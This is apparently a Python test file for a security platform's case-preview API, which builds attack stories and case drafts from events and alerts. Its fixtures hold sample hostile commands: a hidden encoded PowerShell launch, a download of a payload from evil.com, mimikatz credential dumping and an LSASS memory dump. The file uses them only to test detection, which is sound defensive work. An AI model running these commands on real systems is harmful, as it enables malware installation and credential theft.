"""
tests.test_case_preview_api
===============================
POST /api/cases/preview API endpoint testleri.
FastAPI TestClient ile çalışır — auth dependency'leri override edilir.
DB erişimi yok, tamamen in-memory.
"""

import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.api.routes_case_preview import _case_preview_auth
from app.core.security import get_current_tenant_id


# ---------------------------------------------------------------------------
# Auth Override Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(autouse=True)
def _override_auth():
    """Auth dependency'lerini override et — DB'siz test."""

    async def _mock_user():
        return "test-analyst"

    async def _mock_tenant():
        return "test-tenant"

    app.dependency_overrides[_case_preview_auth] = _mock_user
    app.dependency_overrides[get_current_tenant_id] = _mock_tenant
    yield
    app.dependency_overrides.clear()


@pytest.fixture
def client():
    return TestClient(app)


# ---------------------------------------------------------------------------
# Test Helpers
# ---------------------------------------------------------------------------

def _powershell_chain_raw():
    """PowerShell chain rule'ını tetikleyecek 2 raw event dict."""
    return [
        {
            "type": "PROCESS_START",
            "hostname": "WS-01",
            "user": "admin",
            "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgA",
            "severity": "HIGH",
            "risk_score": 75,
        },
        {
            "type": "PROCESS_START",
            "hostname": "WS-01",
            "user": "admin",
            "command_line": "powershell.exe Invoke-WebRequest http://evil.com/payload -OutFile c:\\temp\\p.exe",
            "severity": "HIGH",
            "risk_score": 80,
        },
    ]


def _credential_chain_alerts():
    """Credential dumping chain tetikleyecek alert dict'ler."""
    return [
        {
            "id": "alert-001",
            "hostname": "DC-01",
            "username": "attacker",
            "type": "PROCESS_START",
            "command_line": "mimikatz.exe privilege::debug",
            "risk_score": 90,
            "severity": "CRITICAL",
            "details": "sekurlsa logonpasswords",
            "rule": "Credential Dumping",
        },
        {
            "id": "alert-002",
            "hostname": "DC-01",
            "username": "attacker",
            "type": "PROCESS_START",
            "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
            "risk_score": 85,
            "severity": "HIGH",
            "details": "lsass dump",
            "rule": "LSASS Access",
        },
    ]


# ---------------------------------------------------------------------------
# 1. Route Registered
# ---------------------------------------------------------------------------

class TestCasePreviewRouteRegistered:

    def test_route_registered(self, client):
        """POST /api/cases/preview kayıtlı — 422 veya 200 (405 değil)."""
        resp = client.post("/api/cases/preview")
        assert resp.status_code != 405, "Route kayıtlı değil!"


# ---------------------------------------------------------------------------
# 2. Raw Events → Case Drafts
# ---------------------------------------------------------------------------

class TestCasePreviewRawEvents:

    def test_raw_events_produces_case_drafts(self, client):
        """POST raw_events → case_drafts boş değil."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        assert resp.status_code == 200
        data = resp.json()
        assert len(data["case_drafts"]) >= 1
        assert len(data["attack_stories"]) >= 1
        assert data["summary"]["total_stories"] >= 1
        assert data["summary"]["total_case_drafts"] >= 1

    def test_raw_events_has_attack_stories(self, client):
        """Response'da attack_stories var ve boş değil."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        assert len(data["attack_stories"]) >= 1
        story = data["attack_stories"][0]
        assert "title" in story
        assert "severity" in story

    def test_raw_events_with_graph(self, client):
        """include_graph=true → story_graphs boş değil."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
            "include_graph": True,
        })
        data = resp.json()
        assert len(data["story_graphs"]) >= 1
        assert data["summary"]["total_graphs"] >= 1

    def test_raw_events_without_graph(self, client):
        """include_graph=false → story_graphs=[]."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
            "include_graph": False,
        })
        data = resp.json()
        assert data["story_graphs"] == []
        assert data["summary"]["total_graphs"] == 0
        # Case draft'lar hâlâ üretilmeli
        assert len(data["case_drafts"]) >= 1


# ---------------------------------------------------------------------------
# 3. Alerts → Case Drafts
# ---------------------------------------------------------------------------

class TestCasePreviewAlerts:

    def test_alerts_produces_case_drafts(self, client):
        """Credential chain alerts → case_drafts."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "alerts",
            "items": _credential_chain_alerts(),
        })
        assert resp.status_code == 200
        data = resp.json()
        assert len(data["case_drafts"]) >= 1
        assert len(data["attack_stories"]) >= 1

    def test_alert_source_has_related_alert_ids(self, client):
        """source_type=alerts → case_drafts[0].related_alert_ids boş değil."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "alerts",
            "items": _credential_chain_alerts(),
        })
        assert resp.status_code == 200
        data = resp.json()
        cd = data["case_drafts"][0]
        assert len(cd.get("related_alert_ids", [])) >= 1


# ---------------------------------------------------------------------------
# 4. Consolidation
# ---------------------------------------------------------------------------

class TestCasePreviewConsolidation:

    def test_consolidate_true_default(self, client):
        """consolidate=true (default) → build_batch ile gruplama."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
            "consolidate": True,
        })
        assert resp.status_code == 200
        data = resp.json()
        assert len(data["case_drafts"]) >= 1

    def test_consolidate_false_separate_cases(self, client):
        """consolidate=false → her story ayrı case."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
            "consolidate": False,
        })
        assert resp.status_code == 200
        data = resp.json()
        # Her story → ayrı case draft
        assert len(data["case_drafts"]) == len(data["attack_stories"])


# ---------------------------------------------------------------------------
# 5. Case Draft Structure
# ---------------------------------------------------------------------------

class TestCasePreviewDraftStructure:

    def test_case_draft_has_required_fields(self, client):
        """CaseDraft tüm beklenen alanlara sahip."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        cd = data["case_drafts"][0]
        required = [
            "id", "title", "severity", "risk_score", "status", "priority",
            "confidence", "summary", "affected_hosts", "affected_users",
            "tactics", "techniques", "related_story_ids", "graph_ids",
            "evidence_items", "timeline_items", "recommended_actions",
            "analyst_questions", "tags", "attributes", "created_at",
        ]
        for field in required:
            assert field in cd, f"Missing field: {field}"

    def test_case_draft_has_evidence_items(self, client):
        """evidence_items dict listesi olmalı."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        cd = data["case_drafts"][0]
        assert isinstance(cd["evidence_items"], list)
        if cd["evidence_items"]:
            ei = cd["evidence_items"][0]
            assert isinstance(ei, dict)
            assert "evidence_type" in ei

    def test_case_draft_has_recommended_actions(self, client):
        """recommended_actions dict listesi olmalı."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        cd = data["case_drafts"][0]
        assert isinstance(cd["recommended_actions"], list)
        if cd["recommended_actions"]:
            ra = cd["recommended_actions"][0]
            assert isinstance(ra, dict)
            assert "action_type" in ra


# ---------------------------------------------------------------------------
# 6. Summary
# ---------------------------------------------------------------------------

class TestCasePreviewSummary:

    def test_summary_fields_present(self, client):
        """Summary tüm beklenen alanları içermeli."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        summary = data["summary"]
        for field in [
            "total_items", "total_stories", "total_graphs",
            "total_case_drafts", "highest_severity", "max_risk_score",
            "affected_hosts", "affected_users",
        ]:
            assert field in summary, f"Missing summary field: {field}"

    def test_summary_counts_match(self, client):
        """total_case_drafts == len(case_drafts)."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        assert data["summary"]["total_case_drafts"] == len(data["case_drafts"])
        assert data["summary"]["total_stories"] == len(data["attack_stories"])
        assert data["summary"]["total_graphs"] == len(data["story_graphs"])


# ---------------------------------------------------------------------------
# 7. Unsupported Source Type → 400
# ---------------------------------------------------------------------------

class TestCasePreviewUnsupported:

    def test_unsupported_source_type_400(self, client):
        """Bilinmeyen source_type → HTTP 400."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "INVALID_TYPE",
            "items": [{"foo": "bar"}],
        })
        assert resp.status_code == 400
        assert "Desteklenmeyen source_type" in resp.json()["detail"]

    def test_unsupported_detail_includes_name(self, client):
        """400 detail'da gönderilen source_type adı var."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "BOGUS",
            "items": [],
        })
        assert resp.status_code == 400
        assert "BOGUS" in resp.json()["detail"]


# ---------------------------------------------------------------------------
# 8. Empty Input → 200
# ---------------------------------------------------------------------------

class TestCasePreviewEmpty:

    def test_empty_items_200(self, client):
        """items=[] → 200, case_drafts=[]."""
        resp = client.post("/api/cases/preview", json={
            "source_type": "raw_events",
            "items": [],
        })
        assert resp.status_code == 200
        data = resp.json()
        assert data["case_drafts"] == []
        assert data["attack_stories"] == []
        assert data["story_graphs"] == []
        assert data["summary"]["total_case_drafts"] == 0
        assert data["summary"]["total_stories"] == 0

    def test_empty_items_all_source_types(self, client):
        """Tüm source_type'lar boş items ile 200."""
        for source_type in ["raw_events", "alerts", "command_results", "normalized_events"]:
            resp = client.post("/api/cases/preview", json={
                "source_type": source_type,
                "items": [],
            })
            assert resp.status_code == 200
            assert resp.json()["case_drafts"] == []


# ---------------------------------------------------------------------------
# 9. Auth Rejected
# ---------------------------------------------------------------------------

class TestCasePreviewAuth:

    def test_unauthenticated_401(self, client):
        """Auth override temizlenince → 401."""
        app.dependency_overrides.clear()

        resp = client.post("/api/cases/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        assert resp.status_code == 401


# ---------------------------------------------------------------------------
# 10. Regression — Existing Endpoints Not Broken
# ---------------------------------------------------------------------------

class TestExistingEndpointsNotBroken:

    def test_story_preview_still_works(self, client):
        """Mevcut /api/story/preview bozulmadı."""
        from app.api.routes_story import _auth_dependency
        app.dependency_overrides[_auth_dependency] = lambda: "test-analyst"

        resp = client.post("/api/story/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        assert resp.status_code == 200
        data = resp.json()
        assert "attack_stories" in data
        assert "case_drafts" not in data  # Preview'da case_drafts yok

    def test_graph_preview_still_works(self, client):
        """Mevcut /api/story/graph-preview bozulmadı."""
        from app.api.routes_story import _graph_auth_dependency
        app.dependency_overrides[_graph_auth_dependency] = lambda: "test-analyst"

        resp = client.post("/api/story/graph-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        assert resp.status_code == 200
        data = resp.json()
        assert "story_graphs" in data
        assert "case_drafts" not in data  # Graph preview'da case_drafts yok

    def test_cases_list_route_exists(self, client):
        """Mevcut /api/cases route'u hâlâ kayıtlı."""
        resp = client.get("/api/cases")
        # 401 veya 200 olabilir (auth bağlı), ama 404/405 olmamalı
        assert resp.status_code != 404
        assert resp.status_code != 405
